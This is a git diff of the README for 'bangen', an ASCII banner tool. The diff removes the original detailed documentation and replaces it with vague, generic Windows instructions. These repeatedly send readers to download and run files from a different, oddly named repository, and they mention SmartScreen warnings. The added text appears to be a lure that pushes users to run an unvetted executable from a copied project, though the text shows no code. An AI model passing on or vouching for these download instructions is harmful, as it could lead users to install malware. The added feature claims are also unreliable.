@@ -1,372 +1,188 @@
-# Bangen ✨
+# ✨ bangen - Colorful ASCII banners in seconds
 
-![App Banner](demo/app_banner.gif)
+[![Download bangen](https://img.shields.io/badge/Download%20bangen-Ready%20to%20Run-blue?style=for-the-badge&logo=github)](https://github.com/Unrequested-venabrachialis330/bangen)
 
----
+## 🖥️ What bangen does
 
-**Bangen** is an ASCII banner renderer built on `pyfiglet`, `rich`, and `Pillow`.
-It gives you a fast live **TUI**, a composable effect pipeline, JSON presets, and export support for `TXT`, `PNG`, and `GIF`.
+bangen is a simple terminal app that makes colorful animated ASCII banners. It takes plain text and turns it into banner art you can show in a Windows terminal. It uses pyfiglet for the banner shapes and rich for the color and motion.
 
-Built for terminal art, title cards, intros, and animated text that still feels sharp when exported.
+Use it when you want to:
+- make a name or message stand out in the terminal
+- add flair to a script or demo
+- show ASCII art with color
+- create quick text banners for your command line
 
----
+## 📥 Download and run on Windows
 
-## 🌿 Screenshot
+To get bangen, visit this page to download:
+https://github.com/Unrequested-venabrachialis330/bangen
 
-![Screenshot](demo/screenshot.png)
+### Steps for Windows users
 
----
+1. Open the link in your browser.
+2. Download the project files to your PC.
+3. If the project includes a ready-to-run Windows file, double-click it.
+4. If you get a folder with files instead, open it and look for the app you should run.
+5. If the app opens in a terminal window, type your text and press Enter.
+6. Follow the on-screen prompts to make your banner.
 
-## Star History ⭐
+## 🧰 What you need
 
-<a href="https://www.star-history.com/#programmersd21/bangen&Date">
-  <picture>
-    <source
-      media="(prefers-color-scheme: dark)"
-      srcset="https://api.star-history.com/svg?repos=programmersd21/bangen&type=Date&theme=dark"
-    />
-    <source
-      media="(prefers-color-scheme: light)"
-      srcset="https://api.star-history.com/svg?repos=programmersd21/bangen&type=Date&theme=light"
-    />
-    <img
-      alt="Star History Chart"
-      src="https://api.star-history.com/svg?repos=programmersd21/bangen&type=Date"
-    />
-  </picture>
-</a>
+bangen is built for a terminal on Windows. A simple setup works best:
 
-## Why It Stands Out ⚡
+- Windows 10 or Windows 11
+- A terminal window such as Windows Terminal or Command Prompt
+- A screen size wide enough for text banners
+- The app files from the download link above
 
-- Live split-screen TUI with export modal
-- Static and animated banner rendering
-- Transparent `PNG` and animated transparent `GIF` export
-- Plain `TXT` export with exact ASCII output
-- CLI export progress with percentage, elapsed time, ETA, and status text
-- Typer-powered CLI help with cleaner option formatting and examples
-- Multi-stop gradients with horizontal or vertical interpolation
-- Built-in presets plus user presets stored in `~/.bangen/presets/`
-- Effect library grouped into motion, visual, temporal, distortion, and signature tiers
-- CLI workflows for rendering, exporting, listing assets, and loading presets
+If you use a font or terminal theme with good contrast, the banner colors will stand out more.
 
-## Quick Look 👀
+## 🎨 Main features
 
-```bash
-bangen "SYSTEM READY" --font slant --gradient "#7c3aed:#06b6d4" --effect glow --effect wave
-```
+- Animated ASCII banners in the terminal
+- Colorful text output
+- Simple text-to-banner flow
+- Works with common terminal tools
+- Built with pyfiglet for banner shapes
+- Built with rich for color and display
+- Fits well in a developer tool workflow
+- Useful for demos, profiles, and terminal art
 
-## Setup 🛠️
+## 🏁 First-time setup
 
-```bash
-git clone https://github.com/programmersd21/bangen.git
-cd bangen
-python -m venv .venv
-source .venv/bin/activate
-pip install -e .
-```
+If you are new to this kind of app, use this short setup path:
 
-🎯 Or download the prebuilts:
+1. Download the files from the link above.
+2. Place them in a folder you can find again, such as Downloads or Desktop.
+3. Open the folder.
+4. Start the app with the file included in the download.
+5. Type a short word first, like your name or a single line of text.
+6. If the banner looks too wide, use shorter text.
 
-https://github.com/programmersd21/bangen/releases/latest
+If the app offers options, choose one at a time so you can see what each setting changes.
 
----
+## 🧭 How to use bangen
 
-### Requirements:
+Use bangen to create banners from normal text.
 
-- Python `3.11+`
-- Pillow is included in the base install
+Example uses:
+- your name
+- a project title
+- a short greeting
+- a status line
+- a fun message for a terminal demo
 
-## Quick Start 🚀
+Suggested workflow:
+1. Open the app.
+2. Enter the text you want to show.
+3. Choose a style if the app asks.
+4. Pick a color or animation effect.
+5. Copy the result or keep it in the terminal.
 
-Render a basic banner:
+For best results:
+- keep the text short
+- use one line for simple banners
+- try a few styles to find one that fits your screen
+- use bright text on a dark terminal background
 
-```bash
-bangen "HELLO"
-```
+## 🛠️ Common use cases
 
-Render with custom styling:
+bangen works well for:
+- command-line demos
+- script headers
+- terminal splash screens
+- ASCII art title lines
+- Neovim-friendly setups
+- developer tools that need a strong visual start
+- fun text art in a terminal session
 
-```bash
-bangen "HELLO" --font slant --gradient "#ff00ff:#00ffff"
-```
+## 📁 Typical folder layout
 
-Render with effects:
+You may see files and folders like these after download:
 
-```bash
-bangen "HELLO" --effect wave --effect glow --effect pulse --speed 1.5 --amplitude 2.0
-```
+- `README.md` — instructions and project info
+- app files — the files used to run bangen
+- source files — code that creates the banners
+- assets — any extra visuals or support files
 
-Run screensaver mode:
+If the download includes several files, keep them together in one folder so the app can find what it needs.
 
-```bash
-bangen "HELLO" --screensaver
-```
+## ⚙️ Tips for better results
 
-Export a GIF:
+- Use short text for clean banners
+- Keep the terminal window wide
+- Use a dark background
+- Close other apps if the terminal looks slow
+- Try one banner at a time when testing
+- Save good banner text for later reuse
 
-```bash
-bangen "HELLO" --effect wave --effect glow --export-gif banner.gif --gif-duration 3 --gif-fps 20
-```
+If your text wraps onto more than one line, shorten it and try again.
 
-## Interface 🎛️
+## 🔍 If the banner looks wrong
 
-### TUI 🖥️
+If the output looks messy:
+- make the terminal wider
+- use fewer words
+- check that the text has no extra spaces
+- try a different style or font
+- reopen the app and enter the text again
 
-Launch the editor:
+If colors do not show well:
+- switch to a darker terminal theme
+- use a terminal that supports ANSI colors
+- test in Windows Terminal first
 
-```bash
-bangen
-```
+## 📌 Project details
 
-Controls:
+- Repository name: bangen
+- Description: colorful animated ASCII banners in your terminal
+- Main tools: pyfiglet and rich
+- Focus: terminal art and text banners
+- Platform focus: Windows download and use
 
-- `↑↓` navigate fields and effects
-- `←→` adjust font or numeric settings
-- `Enter` edit or toggle the selected field
-- `l` load a saved preset or load from a custom preset file
-- `e` open the export dialog
-- `s` save the current preset
-- `q` quit
+## 🧪 Example banner ideas
 
-The effect selector is windowed, so you can move through the full library without overflowing the controls panel.
+Try these in the app:
 
-### Export Dialog 📦
+- bangen
+- Hello World
+- My Project
+- Launch Ready
+- Terminal Art
+- New Session
+- Build 01
 
-Press `e` inside the TUI to open the exporter.
+Short phrases tend to produce cleaner ASCII banner output.
 
-- Toggle `GIF`, `PNG`, and `TXT`
-- Edit the output path directly
-- Adjust GIF-only `duration` and `fps`
-- Auto-update the file extension when the format changes
-- Show live export progress in the modal with percentage, elapsed time, ETA, and stage text
-- Confirm overwrite when the target file already exists
+## 🪟 Windows file handling
 
-### CLI ⌨️
+If Windows asks what to do with the download:
+- choose Open or Save first
+- keep the files in a folder you can reach
+- if you see a zip file, extract it before opening the app
+- if you see an executable file, run it from the folder where you saved it
 
-The CLI is powered by `Typer`, so `bangen --help` now presents a cleaner option list and examples while keeping the same flag-based workflow.
+If SmartScreen appears, check the file name and source before you open it
 
-#### Basic Rendering
+## 🔧 Basic troubleshooting
 
-```bash
-bangen "HELLO"
-bangen "HELLO" --font slant --gradient "#ff00ff:#00ffff"
-bangen "HELLO" --gradient "#ff0000:#ffff00:#00ff00" --gradient-dir vertical
-```
+If the app does not open:
+- confirm the download finished
+- make sure you extracted the files if they came in a zip
+- open the app from the folder, not from inside the browser
+- try again from the download page
 
-#### Discoverability
+If the terminal closes at once:
+- reopen it and run the app from the terminal window
+- read any error message before closing
+- make sure all project files stayed in the same folder
 
-```bash
-bangen --list-effects
-bangen --list-fonts
-bangen --list-presets
-```
+If the banner appears cut off:
+- use a shorter message
+- enlarge the terminal window
+- reduce the font size in the terminal
 
-#### Presets and AI
+## 📎 Download again
 
-```bash
-bangen --preset cyberpunk "HELLO"
-bangen --preset matrix "SYSTEM"
-bangen --preset-file ./my_preset.json "HELLO"
-bangen "HELLO" --ai "retro CRT hacker title"
-```
-
-#### Export
-
-```bash
-bangen "HELLO" --export-txt banner.txt
-bangen "HELLO" --export-png banner.png
-bangen "HELLO" --effect wave --effect glow --export-gif banner.gif --gif-duration 3 --gif-fps 20
-```
-
-CLI exports show a live progress bar with percentage, elapsed time, ETA, and the current export stage.
-
-## Releases 📦
-
-GitHub Actions builds standalone binaries for `Windows`, `macOS`, and `Linux` and uploads them to the matching GitHub release.
-
-- asset names follow the project version from `pyproject.toml`
-- release files include the platform in the filename
-- the release workflow expects a tag matching the project version, for example `v2.2.2`
-- release builds explicitly bundle the TUI package, effect modules, `pyfiglet` font assets, Rich, and Pillow runtime pieces so the standalone app works outside a Python environment
-
-#### Screensaver
-
-Turns any banner text into a full-terminal animated screensaver. It auto-fits the text to the current terminal size, switches between effect scenes, and randomizes speed, amplitude, frequency, and scene duration.
-
-```bash
-bangen "SYSTEM READY" --screensaver
-bangen "NIGHT MODE" --screensaver --screensaver-duration 60
-bangen "SIGNAL" --screensaver --screensaver-seed 42
-```
-
-Notes:
-
-- `Ctrl+C` exits screensaver mode
-- `--font`, `--gradient`, presets, and AI prompts still influence the starting style
-- effect selection is managed by the screensaver engine, so `--effect` is not the main control surface in this mode
-- export flags are ignored while screensaver mode is running
-
-#### Terminal Animation
-
-Useful for temporal effects such as `wipe` and `typewriter`:
-
-```bash
-bangen "HELLO" --effect wipe --animate --animate-duration 5
-```
-
-## Effects Library 🎨
-
-### Motion
-
-- `wave`
-- `vertical_wave`
-- `bounce`
-- `scroll`
-- `drift`
-- `shake`
-
-### Visual
-
-- `gradient_shift`
-- `pulse`
-- `rainbow_cycle`
-- `glow`
-- `flicker`
-- `scanline`
-
-### Temporal
-
-- `typewriter`
-- `fade_in`
-- `wipe`
-- `stagger`
-- `loop_pulse`
-
-### Distortion
-
-- `glitch`
-- `chromatic_aberration`
-- `noise_injection`
-- `melt`
-- `warp`
-- `fragment`
-
-### Signature
-
-- `matrix_rain`
-- `fire`
-- `electric`
-- `vhs_glitch`
-- `neon_sign`
-- `wave_interference`
-- `particle_disintegration`
-
-## Effect Stacks 🧪
-
-Effects are order-sensitive and composable:
-
-```python
-banner.apply(build_effect("wave", config=cfg))
-banner.apply(build_effect("chromatic_aberration", config=cfg))
-banner.apply(build_effect("pulse", config=cfg))
-```
-
-Common style stacks:
-
-- `cyberpunk`: `glitch` + `chromatic_aberration` + `pulse`
-- `neon`: `glow` + `pulse` or `neon_sign`
-- `matrix`: `matrix_rain` + `typewriter`
-- `retro`: `scanline` + `flicker`
-- `fire`: `fire` + `melt`
-- `electric`: `electric` + `glow`
-
-## Styling & Presets 🌈
-
-### Gradients
-
-Use colon-separated hex stops:
-
-```text
-#ff00ff:#00ffff
-#ff0000:#ffff00:#00ff00
-```
-
-Use `--gradient-dir vertical` for top-to-bottom interpolation.
-
-### Presets 💾
-
-#### Storage
-
-Saved presets live under:
-
-```text
-~/.bangen/presets/*.json
-```
-
-You can create these files manually, save them from the TUI with `s`, or save from the CLI with `--save-preset NAME`.
-
-#### Loading
-
-- TUI: press `l`, then choose `SAVED` or `FILE`
-- CLI: `--preset NAME` loads from built-ins or `~/.bangen/presets/`
-- CLI: `--preset-file PATH` loads a preset JSON from any path without saving it
-
-#### Preset Format
-
-```json
-{
-  "name": "my_preset",
-  "font": "ansi_shadow",
-  "gradient": "#ff00ff:#00ffff",
-  "gradient_direction": "horizontal",
-  "effects": ["wave", "glow", "pulse"],
-  "effect_config": {
-    "wave": { "speed": 1.8, "amplitude": 2.0, "frequency": 0.7 },
-    "pulse": { "speed": 1.2, "min_brightness": 0.55 },
-    "glow": {}
-  }
-}
-```
-
-Notes:
-
-- `name`, `font`, and `gradient` should always be provided
-- `effects` order matters
-- `speed`, `amplitude`, and `frequency` map to shared `EffectConfig`
-- any additional keys inside `effect_config` are passed to the effect constructor
-
-## Project Layout 🧱
-
-```text
-bangen/
-├── effects/
-│   ├── base.py
-│   ├── distortion.py
-│   ├── motion.py
-│   ├── signature.py
-│   ├── temporal.py
-│   ├── utils.py
-│   └── visual.py
-├── export/
-│   ├── exporter.py
-│   ├── gif.py
-│   ├── png.py
-│   └── txt.py
-├── gradients/
-├── presets/
-├── rendering/
-└── tui/
-    ├── app.py
-    ├── export_dialog.py
-    └── preset_dialog.py
-```
-
-## Notes 📝
-
-- Animated exports look best when you keep effect stacks readable instead of maxing out distortion-heavy combinations.
-- Temporal effects such as `wipe` and `typewriter` are best previewed with `--animate` in the terminal before exporting.
-- `--screensaver` is designed for live terminal playback, not export generation.
-
-## License 📄
-
-MIT. See [LICENSE](LICENSE).
+If you need to get bangen again, use this link:
+https://github.com/Unrequested-venabrachialis330/bangen
